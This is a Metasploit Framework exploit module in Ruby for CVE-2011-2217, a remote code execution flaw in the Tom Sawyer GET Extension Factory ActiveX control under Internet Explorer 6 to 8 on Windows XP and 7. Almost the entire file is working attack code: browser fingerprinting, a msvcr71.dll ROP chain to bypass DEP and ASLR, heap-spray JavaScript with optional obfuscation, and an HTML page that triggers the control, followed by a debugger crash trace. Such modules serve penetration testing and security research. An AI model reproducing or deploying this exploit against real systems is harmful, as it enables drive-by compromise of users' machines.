##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
    include Msf::Exploit::Remote::BrowserAutopwn
 
    autopwn_info({
        :os_name    => OperatingSystems::WINDOWS,
        :ua_name    => HttpClients::IE,
        :ua_minver  => "6.0",
        :ua_maxver  => "8.0",
        :javascript => true,
        :rank       => NormalRanking,
        :classid    => "{658ED6E7-0DA1-4ADD-B2FB-095F08091118}"
    })
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => "Tom Sawyer Software GET Extension Factory Remote Code Execution",
            'Description'    => %q{
                    This module exploits a remote code execution vulnerability in the tsgetx71ex553.dll
                ActiveX control installed with Tom Sawyer GET Extension Factory due to an incorrect
                initialization under Internet Explorer.
 
                While the Tom Sawyer GET Extension Factory is installed with some versions of  VMware
                Infrastructure Client, this module has been tested only with the versions installed
                with Embarcadero Technologies ER/Studio XE2 / Embarcadero Studio Portal 1.6. The ActiveX
                control tested is tsgetx71ex553.dll, version 5.5.3.238.
 
                This module achieves DEP and ASLR bypass using the well known msvcr71.dll rop chain. The
                dll is installed by default with the Embarcadero software, and loaded by the targeted
                ActiveX.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Elazar Broad', # Vulnerability discovery
                    'rgod', # PoC
                    'juan vazquez' # Metasploit module
                ],
            'References'     =>
                [
                    [ 'CVE', '2011-2217' ],
                    [ 'OSVDB', '73211' ],
                    [ 'BID', '48099' ],
                    [ 'URL', 'http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=911' ]
                ],
            'Payload'        =>
                {
                    'Space'           => 1024,
                    'BadChars'        => "\x00",
                    'DisableNops'     => true
                },
            'DefaultOptions'  =>
                {
                    'ExitFunction'         => "process",
                    'InitialAutoRunScript' => 'migrate -f'
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    # Embarcadero Technologies ER/Studio XE2
                    # tsgetx71ex553.dll 5.5.3.238
                    [ 'Automatic', {} ],
                    [ 'IE 6 on Windows XP SP3',
                        {
                            'Rop'    => nil,
                            'Offset' => '0x00'
                        }
                    ],
                    [ 'IE 7 on Windows XP SP3',
                        {
                            'Rop'    => nil,
                            'Offset' => '0x800 - code.length'
                        }
                    ],
                    [ 'IE 8 on Windows XP SP3',
                        {
                            'Rop'    => true,
                            'Offset' => '0x0',
                            'RopChainOffset' => '0x73e'
                        }
                    ],
                    [ 'IE 8 on Windows 7 SP1',
                        {
                            'Rop'    => true,
                            'Offset' => '0x0',
                            'RopChainOffset' => '0x73e'
                        }
                    ]
                ],
            'Privileged'     => false,
            'DisclosureDate' => "May 03 2011",
            'DefaultTarget'  => 0))
 
        register_options(
            [
                OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])
            ], self.class)
    end
 
    def get_target(agent)
        #If the user is already specified by the user, we'll just use that
        return target if target.name != 'Automatic'
 
        if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
            return targets[1]  #IE 6 on Windows XP SP3
        elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
            return targets[2]  #IE 7 on Windows XP SP3
        elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 8/
            return targets[3]  #IE 8 on Windows XP SP3
        elsif agent =~ /NT 6\.1/ and agent =~ /MSIE 8/
            return targets[4]  #IE 8 on Windows 7 SP1
        else
            return nil
        end
    end
 
    def junk(n=4)
        return rand_text_alpha(n).unpack("V").first
    end
 
    def nop
        return make_nops(4).unpack("V").first
    end
 
    def get_rop_chain(t)
 
        adjust =
        [
            junk,  # heap sprayed to 342d1ea0
            0x7c1ce310,  # stackpivot # push ecx # pop esp # pop edi # pop esi # retn 18 # mfc71.DLL
            0x7c347f98,  # RETN (ROP NOP) # msvcr71.dll
            junk,
            junk,
            junk,
            junk,
            junk,
            junk
        ].pack("V*")
 
        # chain generated by mona.py - See corelan.be
        rop =
        [
            0x7c37653d,  # POP EAX # POP EDI # POP ESI # POP EBX # POP EBP # RETN
            0xfffffdff,  # Value to negate, will become 0x00000201 (dwSize)
            0x7c347f98,  # RETN (ROP NOP)
            0x7c3415a2,  # JMP [EAX]
            0xffffffff,
            0x7c376402,  # skip 4 bytes
            0x7c351e05,  # NEG EAX # RETN
            0x7c345255,  # INC EBX # FPATAN # RETN
            0x7c352174,  # ADD EBX,EAX # XOR EAX,EAX # INC EAX # RETN
            0x7c344f87,  # POP EDX # RETN
            0xffffffc0,  # Value to negate, will become 0x00000040
            0x7c351eb1,  # NEG EDX # RETN
            0x7c34d201,  # POP ECX # RETN
            0x7c38b001,  # &Writable location
            0x7c347f97,  # POP EAX # RETN
            0x7c37a151,  # ptr to &VirtualProtect() - 0x0EF [IAT msvcr71.dll]
            0x7c378c81,  # PUSHAD # ADD AL,0EF # RETN
            0x7c345c30,  # ptr to 'push esp #  ret '
        ].pack("V*")
 
        code = adjust
        code << rop
 
        return code
    end
 
 
    def on_request_uri(cli, request)
        agent = request.headers['User-Agent']
        my_target = get_target(agent)
 
        # Avoid the attack if the victim doesn't have the same setup we're targeting
        if my_target.nil?
            print_error("Browser not supported: #{agent.to_s}")
            send_not_found(cli)
            return
        end
 
        print_status("Target set: #{my_target.name}")
 
        p = payload.encoded
        js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
        js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))
        js_90_nops = Rex::Text.to_unescape(make_nops(4), Rex::Arch.endian(my_target.arch))
 
        if my_target['Rop'].nil?
            js_shellcode = "var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);"
        else
            js_rop = Rex::Text.to_unescape(get_rop_chain(my_target), Rex::Arch.endian(my_target.arch))
            js_shellcode = <<-JS_ROP
            var rop_chain = unescape("#{js_rop}");
            var nops_padding = nops.substring(0, 0x73e-code.length-offset.length);
            var shellcode = code + nops_padding + rop_chain + nops_90.substring(0, 0x800-code.length-nops_padding.length-rop_chain.length);
            JS_ROP
            js_shellcode = js_shellcode.gsub(/^\t\t\t/, '')
        end
 
        js = <<-JS
        var heap_obj = new heapLib.ie(0x20000);
        var code = unescape("#{js_code}");
        var nops = unescape("#{js_nops}");
        var nops_90 = unescape("#{js_90_nops}");
 
        while (nops.length < 0x80000) nops += nops;
        while (nops_90.length < 0x80000) nops_90 += nops_90;
 
        var offset = nops.substring(0, #{my_target['Offset']});
        #{js_shellcode}
 
        while (shellcode.length < 0x40000) shellcode += shellcode;
        var block = shellcode.substring(0, (0x80000-6)/2);
 
 
        heap_obj.gc();
        for (var z=1; z < 0x685; z++) {
            heap_obj.alloc(block);
        }
 
        JS
 
        js = heaplib(js, {:noobfu => true})
 
        #obfuscate on demand
        if datastore['OBFUSCATE']
            js = ::Rex::Exploitation::JSObfu.new(js)
            js.obfuscate
        end
 
        html = <<-EOS
        <html>
        <head>
        <script>
        #{js}
        </script>
        </head>
        <body>
        <object classid="clsid:658ED6E7-0DA1-4ADD-B2FB-095F08091118">
        </object>
        </body>
        </html>
        EOS
 
        html = html.gsub(/^\t\t/, '')
 
        print_status("Sending html")
        send_response(cli, html, {'Content-Type'=>'text/html'})
 
    end
 
end
 
=begin
(b44.b48): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=0013e27c ecx=342d1ea0 edx=00000000 esi=75c63d38 edi=80004002
eip=28d2954d esp=0013e230 ebp=0013e2d4 iopl=0         nv up ei pl nz ac pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010216
tsgetx71ex553!Ordinal931+0x2dd:
28d2954d ff5104          call    dword ptr [ecx+4]    ds:0023:342d1ea4=????????
=end